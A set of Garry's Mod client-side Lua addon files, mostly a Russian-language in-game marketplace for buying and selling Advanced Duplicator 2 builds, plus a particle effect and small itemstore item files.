				particle:SetGravity( Vector(0, 0, math.Rand(100, 200) ) )

				particle:SetDieTime( math.Rand( 0.5, 1.0 ) )

				particle:SetStartAlpha( math.Rand( 25, 70 ) )
				particle:SetEndAlpha( 0 )

				particle:SetStartSize( math.Rand( 3, 7 ) )
				particle:SetEndSize( math.Rand( 20, 50 ) )

				particle:SetRoll( math.Rand( -25, 25 ) )
				particle:SetRollDelta( math.Rand( -0.05, 0.05 ) )

				particle:SetColor( 120, 120, 120 )
		end
		
		if math.random( 1, 2 ) == 1 then

			for j = 1,2 do

				for i = -1,1,2 do 

					local particle = emitter:Add( "effects/muzzleflash"..math.random( 1, 4 ), self.Position - 3 * self.Forward + 2 * j * i * self.Right)

						particle:SetVelocity( 60 * j * i * self.Right + AddVel )
						particle:SetGravity( AddVel )

						particle:SetDieTime( 0.1 )

						particle:SetStartAlpha( 150 )

						particle:SetStartSize( j )
						particle:SetEndSize( 4 * j )

						particle:SetRoll( math.Rand( 180, 480 ) )
						particle:SetRollDelta( math.Rand( -1, 1 ) )

						particle:SetColor( 255, 255, 255 )	
				end
			end

			for i = 1,2 do 

				local particle = emitter:Add( "effects/muzzleflash"..math.random( 1, 4 ), self.Position + 8 * self.Forward )

					particle:SetVelocity( 350 * self.Forward + 1.1 * AddVel )
					particle:SetAirResistance( 160 )

					particle:SetDieTime( 0.1 )

					particle:SetStartAlpha( 160 )
					particle:SetEndAlpha( 0 )

					particle:SetStartSize( 6 * i )
					particle:SetEndSize( 5 * i )

					particle:SetRoll( math.Rand( 180, 480 ) )
					particle:SetRollDelta( math.Rand( -1, 1) )

					particle:SetColor( 255, 255, 255 )	
			end
		end
		end
	emitter:Finish()
	end
	end
end


function EFFECT:Think()

	return false
end


function EFFECT:Render()
end
--PATH addons/enc_advmarket/lua/market/client/cl_main.lua:
local tblMyDub = {}

local function CheckLetter(String)
    local TableLetters = {"1", "2", "3", "4", "5", "6", "7", "8", "9", "0"}
    local Accept = false 
    for k, v in pairs(TableLetters) do 
        if v == string.upper(String) then 
            Accept = true 
        end 
    end 
    return Accept 
end

local function IncludeDir(path)
    local f,d = file.Find(path..'/*','DATA')
    local tbl = {}
    if not istable(f) then return end 
    for k, v in ipairs(f) do 
        local a = path..'/'..v

        tblMyDub[#tblMyDub + 1] = a
    end

    for k,v in ipairs(d) do 
        IncludeDir(path..'/'..v)
    end
end

do
	local q = {{},{},{},{}}
	local q1, q2, q3, q4 = q[1], q[2], q[3], q[4]
	local drawpoly = surface.DrawPoly
	function surface.DrawQuad(x1, y1, x2, y2, x3, y3, x4, y4)
		q1.x, q1.y = x1, y1
		q2.x, q2.y = x2, y2
		q3.x, q3.y = x3, y3
		q4.x, q4.y = x4, y4
		drawpoly(q)
	end

	local quv = {{},{},{},{}}
	local quv1, quv2, quv3, quv4 = quv[1], quv[2], quv[3], quv[4]
	local math_min, math_max = math.min, math.max
	function surface.DrawQuadUV(x1, y1, x2, y2, x3, y3, x4, y4)
		local xmin, ymin = math_max, math_max
		local xmax, ymax = math_min, math_min

		xmin = x1
		if x2 < xmin then xmin = x2 end
		if x3 < xmin then xmin = x3 end
		if x4 < xmin then xmin = x4 end

		ymin = y1
		if y2 < ymin then ymin = y2 end
		if y3 < ymin then ymin = y3 end
		if y4 < ymin then ymin = y4 end

		xmax = x1
		if x2 > xmax then xmax = x2 end
		if x3 > xmax then xmax = x3 end
		if x4 > xmax then xmax = x4 end

		ymax = y1
		if y2 > ymax then ymax = y2 end
		if y3 > ymax then ymax = y3 end
		if y4 > ymax then ymax = y4 end

		local dy = ymax - ymin
		local dx = xmax - xmin

		quv1.u, quv1.v = (x1-xmin)/dx, (y1-ymin)/dy
		quv2.u, quv2.v = (x2-xmin)/dx, (y2-ymin)/dy
		quv3.u, quv3.v = (x3-xmin)/dx, (y3-ymin)/dy
		quv4.u, quv4.v = (x4-xmin)/dx, (y4-ymin)/dy

		quv1.x, quv1.y = x1, y1
		quv2.x, quv2.y = x2, y2
		quv3.x, quv3.y = x3, y3
		quv4.x, quv4.y = x4, y4

		drawpoly(quv)
	end

	local drawline = surface.DrawLine
 	function surface.DrawOutlinedQuad(x1, y1, x2, y2, x3, y3, x4, y4)
 		drawline(x1,y1, x2,y2)
 		drawline(x2,y2, x3,y3)
 		drawline(x3,y3, x4,y4)
 		drawline(x4,y4, x1,y1)
	end
end

do
	local cos, sin = math.cos, math.sin
	local ang2rad = 3.141592653589/180
	local drawquad = surface.DrawQuad
	function surface.DrawArc(_x, _y, r1, r2, aStart, aFinish, steps)
		aStart, aFinish = aStart*ang2rad, aFinish*ang2rad
		local step = ((aFinish - aStart) / steps)
		local c = steps

		local a, c1, s1, c2, s2

		c2, s2 = cos(aStart), sin(aStart)
		for _a = 0, steps - 1 do
			a = _a*step + aStart
			c1, s1 = c2, s2
			c2, s2 = cos(a+step), sin(a+step)

			drawquad( _x+c1*r1, _y+s1*r1,
						 _x+c1*r2, _y+s1*r2,
						 _x+c2*r2, _y+s2*r2,
						 _x+c2*r1, _y+s2*r1 )
			c = c - 1
			if c < 0 then break end
		end
	end
end

local draw_Box = draw.RoundedBox
local draw_Boxex = draw.RoundedBoxEx
local draw_Text = draw.SimpleText
local set_Mat = surface.SetMaterial
local set_Color = surface.SetDrawColor
local set_Size = surface.DrawTexturedRect
local set_Font = surface.SetFont
local get_Size = surface.GetTextSize

do 
    local hook_Add = hook.Add
    local math_Round = math.Round
    local scrw, scrh = ScrW()/1920, ScrH()/1080
    hook_Add('OnScreenSizeChanged','ENC:ScScreenScale',function()
        scrw, scrh = ScrW()/1920, ScrH()/1080
    end)

    function enc.h(px)
        return math_Round(px*scrh)
    end

    function enc.w(px)
        return math_Round(px*scrw)
    end
end

do
    local create_Font = surface.CreateFont
    create_Font('MB_60',{
        font = "Montserrat Bold",
        size = enc.h(60),
        weight = 500,
        extended = true,
    })
    create_Font('MB_35',{
        font = "Montserrat Bold",
        size = enc.h(35),
        weight = 500,
        extended = true,
    })
    create_Font('MB_40',{
        font = "Montserrat Bold",
        size = enc.h(40),
        weight = 500,
        extended = true,
    })
    create_Font('MB_25',{
        font = "Montserrat Bold",
        size = enc.h(25),
        weight = 500,
        extended = true,
    })
    create_Font('MM_20',{
        font = "Montserrat Medium",
        size = enc.h(20),
        weight = 500,
        extended = true,
    })
    create_Font('MM_18',{
        font = "Montserrat Medium",
        size = enc.h(20),
        weight = 500,
        extended = true,
    })
    create_Font('MM_42',{
        font = "Montserrat Medium",
        size = enc.h(42),
        weight = 500,
        extended = true,
    })
    create_Font('MM_37',{
        font = "Montserrat Medium",
        size = enc.h(37),
        weight = 500,
        extended = true,
    })
    create_Font('M_14',{
        font = "Montserrat",
        size = enc.h(14),
        weight = 500,
        extended = true,
    })
    create_Font('M_12',{
        font = "Montserrat",
        size = enc.h(12),
        weight = 500,
        extended = true,
    })
    create_Font('M_20',{
        font = "Montserrat",
        size = enc.h(20),
        weight = 500,
        extended = true,
    })
    create_Font('M_22',{
        font = "Montserrat",
        size = enc.h(22),
        weight = 500,
        extended = true,
    })
end

local function getmat(mat)
    return Material('materials/enc_adv/'..mat..'.png', 'smooth noclamp') 
end

local mat1 = getmat('group_37086')
local mat2 = getmat('polyasdsadasdgon_1')
local mat3 = getmat('groasdup_3704212')
local mat4 = getmat('bx_up-arrow')
local mat5 = getmat('bx_up-arrow4')
local mat6 = getmat('bx_up-arrow2')
local mat7 = getmat('bx_up-arrow3')

local main
function enc.CreateLot()
    if IsValid(main) then return end

    main = vgui.Create('EditablePanel')
    main:SetSize(enc.w(704),enc.h(725))
    main:Center()
    main:MakePopup()
    function main:Paint(w,h)
        set_Mat(mat1)
        set_Color(255,255,255)
        set_Size(0,0,w,h)
        
        draw_Text('Добавление лота','MB_60',enc.w(50),enc.h(25))

        draw_Text('Название','MB_25',enc.w(50),enc.h(124))
        draw_Text('Описание','MB_25',enc.w(50),enc.h(242))
        draw_Text('Выбор постройки','MB_25',enc.w(50),enc.h(494))
        draw_Text('Цена','MB_25',enc.w(50),enc.h(612))
    end

    do
        local close = vgui.Create('DButton',main)
        close:SetPos(main:GetWide()-enc.w(85),enc.h(41))
        close:SetSize(enc.w(35),enc.h(35))
        close:SetText('')
        function close:Paint(w,h)
            draw_Text('✕','MB_35',w/2,h/2,enc.Colors.white,1,1)
        end
        function close:DoClick()
            main:Remove()
        end
    end

    local entryname = vgui.Create('Panel',main)
    entryname:Dock(TOP)
    entryname:DockMargin(enc.w(40),enc.h(157),enc.w(40),0)
    entryname:SetTall(enc.h(58))
    function entryname:Paint(w,h)
        draw_Box(8,0,0,w,h,enc.Colors.ibg)
    end

    local name = vgui.Create('DTextEntry',entryname)
    name:Dock(FILL)
    name:DockMargin(enc.w(20),enc.h(17),enc.w(20),enc.h(17))
    name:SetValue('Название...')
    name:SetDrawLanguageID(false)
    name:SetFont('M_20')
    function name:OnMousePressed() 
        name:SetValue("")
    end
    function name:Paint(w,h) 
        self:DrawTextEntryText(enc.Colors.whiteaa,enc.Colors.whitea,enc.Colors.whitea)
    end

    local entrydesc = vgui.Create('DTextEntry',main)
    entrydesc:Dock(TOP)
    entrydesc:DockMargin(enc.w(40),enc.h(60),enc.w(40),0)
    entrydesc:SetTall(enc.h(192))
    function entrydesc:Paint(w,h)
        draw_Box(8,0,0,w,h,enc.Colors.ibg)
    end

    local desc = vgui.Create('DTextEntry',entrydesc)
    desc:Dock(FILL)
    desc:DockMargin(enc.w(20),enc.h(17),enc.w(20),enc.h(17))
    desc:SetValue('Описание...')
    desc:SetDrawLanguageID(false)
    desc:SetFont('M_20')
    desc:SetMultiline(true)
    function desc:OnMousePressed() 
        desc:SetValue("")
    end
    function desc:Paint(w,h) 
        self:DrawTextEntryText(enc.Colors.whiteaa,enc.Colors.whitea,enc.Colors.whitea)
    end

    local selected
    tblMyDub = {}
    local _data = IncludeDir('advdupe2')
    local selectc = vgui.Create("DButton",main)
    selectc:Dock(TOP)
    selectc:DockMargin(enc.w(40),enc.h(60),enc.w(40),0)
    selectc:SetTall(enc.h(58))
    selectc:SetText("")
    selectc.text = 'Выбор постройки'
    function selectc:Paint(w,h)
        draw_Box(8,0,0,w,h,enc.Colors.ibg)
        draw_Text(self.text,'M_20',enc.w(20),h/2,enc.Colors.whiteaa,0,1)

        set_Mat(mat2)
        set_Color(255,255,255)
        set_Size(enc.w(586),enc.h(25),enc.w(15),enc.h(12))
    end
    function selectc:DoClick()
        local menu = DermaMenu()
        for k,v in ipairs(tblMyDub) do
            menu:AddOption(v, function() 
                selected = v 
                self.text = selected
            end)	
        end
        menu:Open()			
    end

    local entryprice = vgui.Create('Panel',main)
    entryprice:Dock(TOP)
    entryprice:DockMargin(enc.w(40),enc.h(60),enc.w(452),0)
    entryprice:SetTall(enc.h(58))
    function entryprice:Paint(w,h)
        draw_Box(8,0,0,w,h,enc.Colors.ibg)
    end


    local price = vgui.Create('DTextEntry',entryprice)
    price:Dock(FILL)
    price:DockMargin(enc.w(20),enc.h(17),enc.w(20),enc.h(17))
    price:SetValue('Цена...')
    price:SetDrawLanguageID(false)
    price:SetFont('M_20')
    function price:OnMousePressed() 
        price:SetValue("")
    end
    function price:Paint(w,h) 
        self:DrawTextEntryText(enc.Colors.whiteaa,enc.Colors.whitea,enc.Colors.whitea)
    end
    function price:AllowInput(stringValue)
        if not CheckLetter(stringValue) then 
            return true
        end
    end 

    local createlot = vgui.Create('DButton',main)
    createlot:SetSize(enc.w(335),enc.h(88))
    createlot:SetPos(enc.w(329),enc.h(612))
    createlot:SetText('ВЫСТАВИТЬ')
    createlot:SetTextColor(enc.Colors.white)
    createlot:SetFont('MM_37')
    createlot.alpha = 1
    function createlot:Paint(w,h)
        local hov = self:IsHovered()
        local ft = FrameTime() * 8
        if hov then
            self.alpha = Lerp(ft, self.alpha, 1)
        else
            self.alpha = Lerp(ft, self.alpha, 0.5)
        end
        
        local clr = ColorAlpha(enc.Colors.blue, 255 * self.alpha)
        draw_Box(8,0,0,w,h,clr)
    end
    function createlot:DoClick()
        local nt = name:GetValue()
        local dt = desc:GetValue()
        local pt = tonumber(price:GetValue())
        if not nt or not dt or not pt or not selected then return end

        local file1 = file.Read(selected, "DATA")

        if #file1 > 16384 then
            notification.AddLegacy('Файл весит больше 16 киллобайт!',2,5)
            return
        end

        if #file1 < 1024 then
            notification.AddLegacy('Файл весит меньше 1 киллобайта!',2,5)
            return
        end

        if #nt <= 3 then
            notification.AddLegacy('Название постройки должно быть не меньше 3 символов',2,5)
            return
        end

        if #nt >= 500 then
            notification.AddLegacy('Слишком длинное название!',2,5)
            return
        end

        if #dt <= 7 then
            notification.AddLegacy('Описание постройки должно быть не меньше 7 символов',2,5)
            return
        end

        if #dt >= 1000 then
            notification.AddLegacy('Слишком длинное описание!',2,5)
            return
        end

        if not isnumber(pt) then
            notification.AddLegacy('Сумма должна быть числом!',2,5)
            return
        end

        if pt < 30000 then
            notification.AddLegacy('Сумма должна быть не меньше 30.000$',2,5)
            return
        end

        if pt > 10000000 then
            notification.AddLegacy('Сумма должна быть не больше 10.000.000$',2,5)
            return
        end

        net.Start('enc.market.newlot')
            net.WriteString(nt)
            net.WriteString(dt)
            net.WriteUInt(pt,32)
            net.WriteString(selected)
            net.WriteString(util.Base64Encode(file1))
        net.SendToServer()

        main:Remove()
    end
end

local main
net.Receive('enc.market.view',function()
    if IsValid(main) then return end

    local name, desc, owner, price = net.ReadString(), net.ReadString(), net.ReadString(), net.ReadUInt(32)
    local debils, dupe, dmpanel = {}
    local count = 0
    net.Receive('enc.market.viewmodel',function()
        local int = net.ReadUInt(16)
        dupe = util.Decompress(net.ReadData(int))
        dupe = util.JSONToTable(dupe)
    end)
    main = vgui.Create('EditablePanel')
    main:SetSize(enc.w(1197),enc.h(725))
    main:Center()
    main:MakePopup()
    function main:Paint(w,h)
        draw_Box(8,0,0,w,h,enc.Colors.blue)
        draw_Box(8,2,2,w-4,h-4,enc.Colors.bg)

        draw_Text('Просмотр предмета','MB_60',enc.w(41))
        if #name > 80 then
            draw_Text(string.sub(name, 1, 80) .. '...','MB_40',enc.w(53),enc.h(405))
        else
            draw_Text(name .. ' - постройка содержит: ' .. count .. ' пропов','MB_40',enc.w(53),enc.h(405))
        end
    end

    local dpanel = vgui.Create('DButton', main)
    dpanel:SetPos(enc.w(49), enc.h(445))
    dpanel:SetText('Владелец: ' .. util.SteamIDFrom64(owner))
    dpanel:SetFont('MB_25')
    dpanel:SetTextColor(enc.Colors.whitea)
    dpanel:SizeToContents()
    dpanel.Paint = function(s, w, h) end
    function dpanel:DoClick()
        SetClipboardText(util.SteamIDFrom64(owner))

        notification.AddLegacy('Вы скопировали SteamID', 2, 2)
    end

    do
        local close = vgui.Create('DButton',main)
        close:SetPos(main:GetWide()-enc.w(61),enc.h(20))
        close:SetSize(enc.w(20),enc.h(20))
        close:SetText('')
        function close:Paint(w,h)
            draw_Text('✕','MB_35',w/2,h/2,enc.Colors.white,1,1)
        end
        function close:DoClick()
            main:Remove()
        end
    end

    local vpanel = vgui.Create('Panel', main )
	vpanel:Dock( TOP )
	vpanel:DockMargin(enc.w(43),enc.h(61),enc.w(43),0)
	vpanel:SetTall(enc.h(321))

    local load = vgui.Create('Panel',main)
    load:SetPos(enc.w(500),enc.h(140))
    load:SetSize(enc.w(200),enc.h(200))
    function load:Paint(w,h)
        local t = CurTime() * 10
        local x, y = enc.w(94), enc.h(84)
        set_Color(255, 255, 255)
        draw.NoTexture()
        surface.DrawArc(x, y, enc.w(80), enc.h(84), t * 80, t * 80 + 180, 30)
    end

    function vpanel:Paint(w,h)
        draw_Box(8,0,0,w,h,enc.Colors.ibg)
        if IsValid(load) then
            draw.SimpleText('Обратите внимание! Если постройка долго не грузится, то это может быть обманом!', 'MM_18', w/2, h, enc.Colors.white, 1, 4)
        end
    end

    function main:Think()
        if istable(dupe) and not IsValid(dmpanel) then
            refresh_Model()
        end
    end

    function refresh_Model()
        if IsValid(load) then load:Remove() end
        if not IsValid(vpanel) then return end
        if IsValid(dmpanel) then return end

        dmpanel = vgui.Create( "DAdjustableModelPanel", vpanel )
        dmpanel:Dock(FILL)
        dmpanel:SetModel("models/Gibs/HGIBS.mdl")
        local ent = dmpanel.Entity
        timer.Simple(.1,function()
            if not IsValid(dmpanel) then return end
            dmpanel:MouseCapture( true )
            dmpanel.Capturing = true
        
            dmpanel:SetFirstPerson( true )
        
            dmpanel:CaptureMouse()
        
            local mins, maxs = dmpanel.Entity:GetModelBounds()
            local center = ( mins + maxs ) / 2
        
            local hit1 = util.IntersectRayWithPlane( dmpanel.vCamPos, dmpanel.aLookAngle:Forward(), vector_origin, Vector( 0, 0, 1 ) )
            dmpanel.OrbitPoint = hit1
        
            local hit2 = util.IntersectRayWithPlane( dmpanel.vCamPos, dmpanel.aLookAngle:Forward(), vector_origin, Vector( 0, 1, 0 ) )
            if ( ( !hit1 && hit2 ) || hit2 && hit2:Distance( dmpanel.Entity:GetPos() ) < hit1:Distance( dmpanel.Entity:GetPos() ) ) then dmpanel.OrbitPoint = hit2 end
        
            local hit3 = util.IntersectRayWithPlane( dmpanel.vCamPos, dmpanel.aLookAngle:Forward(), vector_origin, Vector( 1, 0, 0 ) )
            if ( ( ( !hit1 || !hit2 ) && hit3 ) || hit3 && hit3:Distance( dmpanel.Entity:GetPos() ) < hit2:Distance( dmpanel.Entity:GetPos() ) ) then dmpanel.OrbitPoint = hit3 end
        
            dmpanel.OrbitPoint = dmpanel.OrbitPoint or center
            dmpanel.OrbitDistance = ( dmpanel.OrbitPoint - dmpanel.vCamPos ):Length()

            local x, y = dmpanel:CaptureMouse()

            local scale = dmpanel:GetFOV() / 180
            x = x * -0.5 * scale
            y = y * 0.5 * scale
            if ( input.IsShiftDown() ) then y = 0 end

            dmpanel.aLookAngle = dmpanel.aLookAngle + Angle( y * 4, x * 4, 0 )
        
            dmpanel.vCamPos = dmpanel.OrbitPoint - dmpanel.aLookAngle:Forward() * dmpanel.OrbitDistance
            dmpanel:SetFirstPerson( false )
        end)
        
        for k,v in pairs(dupe) do
            if PropWhiteListed[v.Model] and v.Class == 'prop_physics' then
                count = count + 1
            end

            dupeModel = ents.CreateClientProp()
            dupeModel:SetModel(v.Model)
            local obj = v.PhysicsObjects
            for i=0, #obj do
                dupeModel:SetPos( obj[i].Pos ) 
                dupeModel:SetAngles( obj[i].Angle )
            end
            if v["EntityMods"] then
                if v["EntityMods"].colour then
                    dupeModel:SetColor(Color(v["EntityMods"].colour.Color.r,v["EntityMods"].colour.Color.g,v["EntityMods"].colour.Color.b))
                end

                if v["EntityMods"].material then
                    dupeModel:SetMaterial(v["EntityMods"].material.MaterialOverride)
                end
            end
            dupeModel:Spawn( )
            
            debils[#debils + 1] = dupeModel
        end

        function ent:RenderOverride( )
            for k, v in pairs(debils) do
                if IsValid(v) then
                    v:DrawModel()
                end
            end
        end
        function main:OnRemove()
            for k,v in pairs(debils) do
                if not IsValid(v) then return end
                v:Remove()
            end
        end
    end

    local scroll = vgui.Create('DScrollPanel',main)
    scroll:Dock(FILL)
    scroll:DockMargin(enc.w(53), enc.h(100), enc.w(80), 0)
    local bar = scroll:GetVBar()
    bar:SetWide(1)
    function bar:Paint(w, h) end
    function bar.btnUp:Paint(w, h) end
    function bar.btnDown:Paint(w, h) end
    function bar.btnGrip:Paint(w, h)
        draw_Box(0, 0, 0, w, h, enc.Colors.blue)
    end

    local txt = string.Wrap('M_22', desc, enc.w(1036))
    for k, v in ipairs(txt) do
        local desc = vgui.Create('DLabel',scroll)
        desc:Dock(TOP)
        desc:SetText(v)
        desc:SetFont('M_22')
        desc:SetColor(enc.Colors.whitea)
    end

    local buy = vgui.Create('DButton',main)
    buy:Dock(BOTTOM)
    buy:DockMargin(enc.w(43),enc.h(22),enc.w(43),enc.h(19))
    buy:SetTall(enc.w(85))
    buy:SetText('Купить (' .. DarkRP.formatMoney(price) .. ')')
    buy:SetFont('MM_42')
    buy:SetTextColor(enc.Colors.white)
    buy.alpha = 1
    function buy:Paint(w,h)
        local hov = self:IsHovered()
        local ft = FrameTime() * 6
        if hov then
            self.alpha = Lerp(ft, self.alpha, 0.5)
        else
            self.alpha = Lerp(ft, self.alpha, 1)
        end
        
        local clr = ColorAlpha(enc.Colors.blue, 255 * self.alpha)

        draw_Box(8,0,0,w,h,clr)
    end
    function buy:DoClick()
        ui.BoolRequest('Покупка дубликата', 'Подтвердите покупку дубликата!', function(bool)
            if bool then
                net.Start('enc.market.buy')
                    net.WriteString(name)
                net.SendToServer()
                main:Remove()
                newpage(1)
            end
        end)
    end
end)

local main
net.Receive('enc.market.openmenu',function()
    if IsValid(main) then return end

    local pl = LocalPlayer()
    local _ = net.ReadUInt(16)
    local tbl = util.JSONToTable(util.Decompress(net.ReadData(_)))
    local page = math.ceil(net.ReadUInt(7) / 10)
    local mypage = 1
    net.Receive('enc.market.refresh',function()
        _ = net.ReadUInt(16)
        tbl = util.JSONToTable(util.Decompress(net.ReadData(_)))
        page = math.ceil(net.ReadUInt(7) / 10)
        mypage = 1
        refresh_Page(tbl,1)
        refresh_Pages()
    end)

    main = vgui.Create('EditablePanel')
    main:SetSize(enc.w(1435),enc.h(745))
    main:Center()
    main:MakePopup()
    function main:Paint(w,h)
        set_Mat(mat3)
        set_Color(255,255,255)
        set_Size(0,0,w,h)
        draw_Text('Маркет построек','MB_60',enc.w(146),enc.h(25))
    end

    do
        set_Font('MB_60')
        local x = get_Size('Маркет построек')

        local newlot = vgui.Create('DButton',main)
        newlot:SetSize(enc.w(192),enc.h(42))
        newlot:SetPos(enc.w(166)+x,enc.h(41))
        newlot:SetText('')
        newlot.alpha = 1
        function newlot:Paint(w,h)
            local hov = self:IsHovered()
            local ft = FrameTime() * 8
            if hov then
                self.alpha = Lerp(ft, self.alpha, 0.5)
            else
                self.alpha = Lerp(ft, self.alpha, 1)
            end

            local clr1 = ColorAlpha(enc.Colors.whiteaa, 127 * self.alpha)

            draw_Box(8,0,0,w,h,clr1)
            draw_Box(8,1,1,w-2,h-2,enc.Colors.ibg)
            draw_Boxex(8,w-enc.w(45)-1,1,enc.w(45),h-2,enc.Colors.blacka,false,true,false,true)

            draw_Text('+','MB_25',(w-enc.w(45)-1)+enc.w(45)/2,h/2,enc.Colors.white,1,1)
            draw_Text('Добавить лот','MM_18',enc.w(20),h/2,enc.Colors.white,0,1)
        end
        newlot.DoClick = enc.CreateLot
    end

    do
        local close = vgui.Create('DButton',main)
        close:SetPos(main:GetWide()-enc.w(146),enc.h(41))
        close:SetSize(enc.w(20),enc.h(20))
        close:SetText('')
        function close:Paint(w,h)
            draw_Text('✕','MB_35',w/2,h/2,enc.Colors.white,1,1)
        end
        function close:DoClick()
            main:Remove()
        end
    end

    function newpage(p)
        mypage = p
        refresh_Page(tbl,p)
    end

    local pagepan
    function refresh_Pages()
        if IsValid(pagepan) then pagepan:Remove() end
        
        pagepan = vgui.Create('Panel',main)
        pagepan:SetSize(page == 1 and enc.w(53) or enc.w(23)*page + enc.w(27),enc.h(16))
        pagepan:CenterHorizontal()
        pagepan:SetY(enc.h(684))
        
        local back = vgui.Create('DButton',pagepan)
        back:Dock(LEFT)
        back:DockMargin(0,0,0,0)
        back:SetWide(enc.w(16))
        back:SetText('')
        back.disbled = true
        function back:Paint(w,h)
            set_Color(255,255,255)
  
            if not self.disbled then
                set_Mat(mat4)
                set_Size(0,0,w,h)
            else
                set_Mat(mat5)
                set_Size(0,0,w,h)
            end
        end
        function back:DoClick()
            if mypage == 1 then 
                return
            end
            mypage = mypage - 1
            newpage(mypage)
        end
        function back:Think()
            if mypage == 1 then
                self.disbled = true
            else
                self.disbled = false
            end
        end

        for i = 1, page do
            local npage = vgui.Create('DButton',pagepan)
            npage:Dock(LEFT)
            npage:SetWide(enc.w(16))
            npage:DockMargin(enc.w(3),0,enc.w(3),0)
            npage:SetText('')
            function npage:Paint(w,h)
                local color = enc.Colors.bnhov
                if i == mypage then
                    color = enc.Colors.blue
                end
                draw_Box(h,0,0,w,h,color)
                
            end
            function npage:DoClick()
                newpage(i)
            end
        end

        local next = vgui.Create('DButton',pagepan)
        next:Dock(LEFT)
        next:SetWide(enc.w(16))
        next:SetText('')
        next.disbled = true
        function next:Paint(w,h)
            set_Color(255,255,255)

            if not self.disbled then
                set_Mat(mat6)
                set_Size(0,0,w,h)
            else
                set_Mat(mat7)
                set_Size(0,0,w,h)
            end
        end
        function next:DoClick()
            if mypage >= page then 
                return
            end
            mypage = mypage + 1
            newpage(mypage)
        end
        function next:Think()
            if mypage >= page then
                self.disbled = true
            else
                self.disbled = false
            end
        end
    end
    refresh_Pages()

    local function splitpage(a, pageNumber)
        local _tbl = {}
        local page, i = 1, 0
    
        for k, v in pairs(a) do
            i = i + 1
            if i > 10 then
                page = page + 1
                i = 1
            end
            if not _tbl[page] then
                _tbl[page] = {}
            end
            _tbl[page][#_tbl[page] + 1] = v
        end
    
        return _tbl[pageNumber]
    end

    do 
        local List = vgui.Create('DIconLayout',main)
        List:Dock(FILL)
        List:DockMargin(enc.w(118),enc.h(124),enc.w(118),enc.h(66))
        List:SetSpaceX(enc.w(10))
        List:SetSpaceY(enc.h(10))

        function refresh_Page(t,page)
            List:Clear()
            for k, v in ipairs(splitpage(t,page) or {}) do
                local selectc = vgui.Create("Panel",List)
                selectc:SetSize(enc.w(594),enc.h(99))
                function selectc:Paint(w,h)
                    draw_Box(8,0,0,w,h,enc.Colors.ibg)
                end

                local viewing = vgui.Create('DButton',selectc)
                viewing:Dock(LEFT)
                viewing:DockMargin(enc.w(13),enc.h(14),0,enc.h(14))
                viewing:SetWide(enc.w(120))
                viewing:SetText('Просмотр')
                viewing:SetFont('M_12')
                viewing:SetTextColor(enc.Colors.whitea)
                viewing.alpha = 1
                function viewing:Paint(w,h)
                    local hov = self:IsHovered()
                    local ft = FrameTime() * 6
                    if hov then
                        self.alpha = Lerp(ft, self.alpha, 0.5)
                    else
                        self.alpha = Lerp(ft, self.alpha, 1)
                    end
                    
                    local clr = ColorAlpha(enc.Colors.bg, 255 * self.alpha)

                    draw_Box(8,0,0,w,h,clr)
                end
                function viewing:DoClick()
                    net.Start('enc.market.view')
                        net.WriteString(v.name)
                    net.SendToServer()
                end

                local name = vgui.Create('DLabel',selectc)
                name:SetSize(enc.w(296),enc.h(27))
                name:SetPos(enc.w(143),enc.h(20))
                name:SetText(v.name)
                name:SetFont('MB_25')
                name:SetColor(enc.Colors.white)

                local scroll = vgui.Create('DScrollPanel',selectc)
                scroll:SetSize(enc.w(260),enc.h(32))
                scroll:SetPos(enc.w(143),enc.h(53))
                local bar = scroll:GetVBar()
                bar:SetWide(1)
                function bar:Paint(w, h) end
                function bar.btnUp:Paint(w, h) end
                function bar.btnDown:Paint(w, h) end
                function bar.btnGrip:Paint(w, h)
                    draw_Box(0, 0, 0, w, h, enc.Colors.blue)
                end

                local txt = string.Wrap('M_14', v.desc, enc.w(260))
                for k, v in ipairs(txt) do
                    local desc = vgui.Create('DLabel',scroll)
                    desc:Dock(TOP)
                    desc:SetText(v)
                    desc:SetFont('M_14')
                    desc:SetColor(enc.Colors.whitea)
                end

                if v.sid ~= pl:SteamID64() then
                    local buy = vgui.Create('DButton',selectc)
                    buy:Dock(RIGHT)
                    buy:DockMargin(0,enc.h(29),enc.w(29),enc.h(29))
                    buy:SetWide(enc.w(125))
                    buy:SetText('КУПИТЬ')
                    buy:SetFont('MM_20')
                    buy:SetTextColor(enc.Colors.white)
                    buy.alpha = 1
                    function buy:Paint(w,h)
                        local hov = self:IsHovered()
                        local ft = FrameTime() * 6
                        if hov then
                            self.alpha = Lerp(ft, self.alpha, 0.5)
                        else
                            self.alpha = Lerp(ft, self.alpha, 1)
                        end
                        
                        local clr = ColorAlpha(enc.Colors.blue, 255 * self.alpha)

                        draw_Box(8,0,0,w,h,clr)
                    end
                    function buy:DoClick()
                        ui.BoolRequest('Покупка дубликата', 'Подтвердите покупку дубликата!', function(bool)
                            if bool then
                                net.Start('enc.market.buy')
                                    net.WriteString(v.name)
                                net.SendToServer()
                                newpage(1)
                            end
                        end)
                    end
                    function buy:DoRightClick()
                        if not enc.Admins[pl:GetUserGroup()] then return end
                        net.Start('enc.market.adelete')
                            net.WriteString(v.name)
                        net.SendToServer()
                    end
                else
                    local delete = vgui.Create('DButton',selectc)
                    delete:Dock(RIGHT)
                    delete:DockMargin(0,enc.h(29),enc.w(29),enc.h(29))
                    delete:SetWide(enc.w(125))
                    delete:SetText('УДАЛИТЬ')
                    delete:SetFont('MM_20')
                    delete:SetTextColor(enc.Colors.white)
                    delete.alpha = 1
                    function delete:Paint(w,h)
                        local hov = self:IsHovered()
                        local ft = FrameTime() * 6
                        if hov then
                            self.alpha = Lerp(ft, self.alpha, 0.3)
                        else
                            self.alpha = Lerp(ft, self.alpha, 1)
                        end
                        
                        local clr = ColorAlpha(enc.Colors.red, 255 * self.alpha)

                        draw_Box(8,0,0,w,h,clr)
                    end
                    function delete:DoClick()
                        net.Start('enc.market.delete')
                            net.WriteString(v.name)
                        net.SendToServer()
                        newpage(1)
                    end
                end
            end
        end
    end
    refresh_Page(tbl,1)
end)

net.Receive('enc.market.buy',function()
	file.CreateDir("advdupe2/market")
    local filename = net.ReadString()
    local construct = net.ReadString()
	local name = filename:match("^.+/(.+)$")	
	file.Write("advdupe2/market/"..name, util.Base64Decode(construct))
end)
--PATH addons/itemstore_new/lua/itemstore/cl_init.lua:
﻿include("shared.lua")
include("cl_gui.lua")
include("cl_player.lua")
--PATH addons/itemstore_new/lua/itemstore/items/drug.lua:
﻿ITEM.Name = itemstore.Translate("drug_name")
ITEM.Description = itemstore.Translate("drug_desc")
ITEM.Model = "models/props_lab/jar01a.mdl"
ITEM.HighlightColor = itemstore.config.HighlightColours.Consumables
